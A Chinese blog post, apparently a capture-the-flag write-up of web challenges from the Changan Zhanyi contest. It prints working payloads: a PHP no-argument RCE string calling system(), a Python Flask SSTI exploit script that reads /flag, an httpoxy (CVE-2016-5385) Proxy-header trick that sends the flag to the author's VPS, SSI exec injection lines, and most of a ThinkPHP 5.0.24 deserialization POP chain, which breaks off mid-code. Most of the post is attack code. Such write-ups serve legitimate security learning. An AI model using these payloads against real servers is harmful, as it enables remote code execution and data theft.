@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Apple.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Apple.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wuyusanhua2021.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="RCE_No_Para1234567891011&lt;?phpif(&amp;#x27;;&amp;#x27; &#x3D;&#x3D;&#x3D; preg_replace(&amp;#x27;&#x2F;[^\W]+\((?R)?\)&#x2F;&amp;#x27;, &amp;#x27;&amp;#x27;, $_GET[&amp;#x27;code&amp;#x27;])) &amp;#123;     if(!preg_match(&amp;#x27;&#x2F;session|end|next|header|dir&#x2F;i&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="长安战疫Web部分">
+<meta property="og:url" content="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/index.html">
+<meta property="og:site_name" content="雾雨散花">
+<meta property="og:description" content="RCE_No_Para1234567891011&lt;?phpif(&amp;#x27;;&amp;#x27; &#x3D;&#x3D;&#x3D; preg_replace(&amp;#x27;&#x2F;[^\W]+\((?R)?\)&#x2F;&amp;#x27;, &amp;#x27;&amp;#x27;, $_GET[&amp;#x27;code&amp;#x27;])) &amp;#123;     if(!preg_match(&amp;#x27;&#x2F;session|end|next|header|dir&#x2F;i&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112133745936.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112135750755.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112144138763.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112152203716.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112152217213.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220113134447628.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220113135151088.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220114131205627.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220114140232863.png">
+<meta property="article:published_time" content="2022-01-12T11:54:37.000Z">
+<meta property="article:modified_time" content="2022-01-15T04:06:30.326Z">
+<meta property="article:author" content="wuyusanhua">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112133745936.png">
+
+<link rel="canonical" href="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>长安战疫Web部分 | 雾雨散花</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="雾雨散花" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雾雨散花</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/sakuya.png">
+      <meta itemprop="name" content="wuyusanhua">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雾雨散花">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          长安战疫Web部分
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-12 19:54:37" itemprop="dateCreated datePublished" datetime="2022-01-12T19:54:37+08:00">2022-01-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-15 12:06:30" itemprop="dateModified" datetime="2022-01-15T12:06:30+08:00">2022-01-15</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>php无参数rce，过滤了一些常用的函数，想办法绕过即可</p>
+<p>payload:<code>code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&amp;a=system(&#39;cat flag.php&#39;);</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/242482.html">无参数读文件和RCE总结</a></p>
+<h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112133745936.png" alt="image-20220112133745936"></p>
+<p>提示转去<code>/admin</code>路由，转到<code>/admin?static.js?</code>，成功登录，根据提示是用name来ssti</p>
+<p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112135750755.png" alt="image-20220112135750755"></p>
+<p>双下划线<code>__</code>被过滤，参考大佬的exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://0932a3a1.lxctf.net&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;name1&#x27;</span>:<span class="string">&#x27;__class__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name2&#x27;</span>: <span class="string">&#x27;__base__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name3&#x27;</span>: <span class="string">&#x27;__subclasses__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name4&#x27;</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name5&#x27;</span>: <span class="string">&#x27;__init__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name6&#x27;</span>: <span class="string">&#x27;__globals__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name7&#x27;</span>: <span class="string">&#x27;__builtins__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name8&#x27;</span>: <span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name9&#x27;</span>: <span class="string">&#x27;/flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name10&#x27;</span>: <span class="string">&#x27;read&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">payload=<span class="string">&#x27;/admin?name=&#123;&#123;()|attr(request.headers.name1)|attr(request.headers.name2)|attr(request.headers.name3)()|attr(request.headers.name4)(186)|attr(request.headers.name5)|attr(request.headers.name6)|attr(request.headers.name4)(request.headers.name7)|attr(request.headers.name4)(request.headers.name8)(request.headers.name9)|attr(request.headers.name10)()&#125;&#125;&amp;.js?&#x27;</span></span><br><span class="line">r=requests.get(url+payload,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Flag配送中心"><a href="#Flag配送中心" class="headerlink" title="Flag配送中心"></a>Flag配送中心</h1><p>查看网页源码可得提示php版本与通信接口协议fastcgi</p>
+<p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112144138763.png" alt="image-20220112144138763"></p>
+<p>考察的是漏洞<code>cve-2016-5385</code>，在vps上开启端口监听，抓包，在文件头添加<code>Proxy: http://vps:port</code>，发送request报文后即可在vps监听到flag</p>
+<p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112152203716.png" alt="image-20220112152203716"></p>
+<p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112152217213.png" alt="image-20220112152217213"></p>
+<h1 id="Shiro-未完成"><a href="#Shiro-未完成" class="headerlink" title="Shiro?(未完成)"></a>Shiro?(未完成)</h1><h1 id="Baby-Upload"><a href="#Baby-Upload" class="headerlink" title="Baby_Upload"></a>Baby_Upload</h1><p>.htaccess,ini,php等均被过滤，未过滤shtml文件，可以进行ssi注入</p>
+<p>上传<code>&lt;!--#exec cmd=&quot;dir /&quot; --&gt;</code>，得到flag文件名称</p>
+<p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220113134447628.png" alt="image-20220113134447628"></p>
+<p>再上传<code>&lt;!--#exec cmd=&quot;cut -b 1-100 /ffffff?llll11111aaaaa4444ggggg&quot; --&gt;</code>,得到flag</p>
+<p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220113135151088.png" alt="image-20220113135151088"></p>
+<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">SSI注入漏洞总结</a></p>
+<h1 id="tp-未完成"><a href="#tp-未完成" class="headerlink" title="tp(未完成)"></a>tp(未完成)</h1><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220114131205627.png"></p>
+<p>访问<code>public/index.php/index/index/upload</code>，得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="variable">$FILES</span>= <span class="variable">$_FILES</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="variable">$_GET</span>,<span class="variable">$_POST</span>) <span class="keyword">as</span> <span class="variable">$_request</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) &#123;</span><br><span class="line">                $&#123;<span class="variable">$_k</span>&#125; = <span class="keyword">$this</span>-&gt;func(<span class="variable">$_v</span>);</span><br><span class="line">                <span class="comment">//$_request[$_k] =  $&#123;$_k&#125;;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = @<span class="variable">$FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$filename</span> = @<span class="variable">$FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;name&quot;</span>].<span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">        move_uploaded_file(<span class="variable">$file</span>,<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;noPHP&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">&amp;<span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array(<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$var</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)&#123;</span><br><span class="line">                <span class="variable">$var</span>[<span class="variable">$_k</span>] = <span class="keyword">$this</span>-&gt;func(<span class="variable">$_v</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$var</span> = addslashes(<span class="variable">$var</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$var</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在变量覆盖，且可以通过unlink触发phar协议</p>
+<p>又有tp版本为5.0.24</p>
+<p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220114140232863.png" alt="image-20220114140232863"></p>
+<p>找tp5.0.24反序列化的poc，修改一下在本地生成phar文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$files</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [<span class="variable">$files</span>]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="variable">$output</span>; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);    </span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="variable">$modelRelation</span>;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::__construct(<span class="variable">$output</span>, <span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">HasOne</span> <span class="title">extends</span> <span class="title">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="variable">$query</span>;    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Query</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;model = <span class="variable">$model</span>; <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Output</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle =<span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span 